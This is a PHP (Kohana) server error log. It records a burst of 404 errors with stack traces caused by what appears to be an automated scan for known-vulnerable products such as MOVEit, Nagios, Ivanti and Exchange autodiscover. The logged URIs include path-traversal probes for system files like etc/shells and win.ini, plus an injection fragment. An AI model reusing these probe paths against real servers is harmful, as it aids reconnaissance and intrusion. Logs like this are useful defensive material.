2025-10-29 19:27:23 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL login was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:23 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL login was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:24 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: CMSInstall/install.aspx ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:24 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: CMSInstall/install.aspx ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:24 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: CMSPages/Staging/syncserver.asmx ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:24 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: CMSPages/Staging/syncserver.asmx ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:24 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: webauth_operation.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:24 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: webauth_operation.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:24 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lucee/admin/imgProcess.cfm ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:24 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lucee/admin/imgProcess.cfm ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:24 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL RestAPI/LogonCustomization was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:24 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL RestAPI/LogonCustomization was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:25 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/geojson was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:25 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/geojson was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:25 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/session/properties was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:25 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/session/properties was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:25 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: owa/auth/y.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:25 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: owa/auth/y.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:25 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: autodiscover/autodiscover.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:25 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: autodiscover/autodiscover.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:25 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL minio/bootstrap/v1/verify was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:25 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL minio/bootstrap/v1/verify was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:25 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: autodiscover/autodiscover.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:25 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: autodiscover/autodiscover.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:25 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: moveitisapi/moveitisapi.dll ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:25 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: moveitisapi/moveitisapi.dll ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:25 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: mifs/.;/services/LogService ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:25 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: mifs/.;/services/LogService ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:25 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: nagiosxi/includes/dashlets/rss_dashlet/magpierss/scripts/magpie_debug.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:25 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: nagiosxi/includes/dashlets/rss_dashlet/magpierss/scripts/magpie_debug.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:25 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL nacos/v1/auth/users was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:25 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL nacos/v1/auth/users was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:25 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: nagiosql/admin/helpedit.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:25 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: nagiosql/admin/helpedit.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:25 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: static\..\..\..\..\..\..\..\..\..\etc\shells ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:25 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: static\..\..\..\..\..\..\..\..\..\etc\shells ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:25 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: nette.micro ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:25 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: nette.micro ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:26 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/6/nginx was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:26 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/6/nginx was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:26 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/4/nginx was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:26 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/4/nginx was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:26 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/5/nginx was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:26 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/5/nginx was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:26 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: web/static/c:/windows/win.ini ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:26 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: web/static/c:/windows/win.ini ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:26 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL web/database/manager was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:26 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL web/database/manager was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:26 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/3/nginx was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:26 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/3/nginx was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:26 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: OA_HTML/AppsLocalLogin.jsp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:26 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: OA_HTML/AppsLocalLogin.jsp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:26 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL system/console/gatewaystatus was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:26 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL system/console/gatewaystatus was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:26 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/.css ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:26 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/.css ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:26 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: unauth/php/change_password.php/"> ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:26 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: unauth/php/change_password.php/"> ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:26 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL pentaho/api/userrolelist/systemRoles was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:26 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL pentaho/api/userrolelist/systemRoles was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:26 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL qrs/ReloadTask was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:26 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL qrs/ReloadTask was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:26 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: dana-na/css/ds.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:26 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: dana-na/css/ds.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:26 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL json was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:26 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL json was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:27 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL cgi-bin was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:27 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL cgi-bin was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:27 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL vmp_getinfo was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:27 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL vmp_getinfo was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:27 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL qzgiapfbkv was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:27 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL qzgiapfbkv was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:27 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL wp-admin was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:27 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL wp-admin was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:27 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL wp-includes was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:27 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL wp-includes was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:27 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lua/login.lua ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:27 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lua/login.lua ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:28 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: sitecore_xaml.ashx/-/xaml/Sitecore.Xaml.Tutorials.Styles.Index ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:28 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: sitecore_xaml.ashx/-/xaml/Sitecore.Xaml.Tutorials.Styles.Index ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:28 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: searchblox/plugin/index.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:28 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: searchblox/plugin/index.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: web.config.i18n.ashx ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: web.config.i18n.ashx ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: plugin/index.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: plugin/index.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL log/view was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL log/view was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/index.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/index.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/swagger/index.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/swagger/index.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL idm/v2/api-docs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger-ui.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger-ui.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL docs/api-reference was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL docs/api-reference was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api-docs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api-docs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/swagger-ui.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/swagger-ui.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger/swagger-ui.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger/swagger-ui.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL swagger/docs/v1 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL swagger/docs/v1 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/swagger/static/index.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/swagger/static/index.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL __swagger__ was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL __swagger__ was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:29 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger/index.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:29 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: swagger/index.html ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
